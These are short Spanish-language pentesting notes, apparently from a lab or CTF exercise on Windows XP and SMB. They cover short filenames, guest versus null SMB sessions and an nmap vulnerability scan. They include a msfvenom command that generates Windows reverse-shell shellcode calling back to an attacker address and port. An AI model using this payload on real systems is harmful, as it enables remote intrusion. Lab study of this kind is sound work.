
# Escapar espacios en windows xp

La mejor forma de escapar los nombres con espacios en windows xp cuando se quiere acceder a un archivo es usando el nombre corto de ese archivo/carpeta, estos se ven usando:

```ruby
dir /x
```

# Diferencia entre usuario guest y null en SMB

- guest: usuario real en la maquina con pirvilegios minimos (a veces deshabilitada)

- null: Modulo especial destinado a conexiones sin credenciales (mas cerrado en verisones como windows 7 o posteriores)

# Rapida deteccion de vulnerabilidades en SMB


```ruby
nmap -p445 --script vuln {IP}
```

## Crear shellcode 

```ruby
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.201 LPORT=4484 \
EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode \
-a x86 --platform windows
```

## Navegación en WIndows XP

En este windows es completamente obligatorio usar los slashes invertidos (\\) en las rutas de archivos.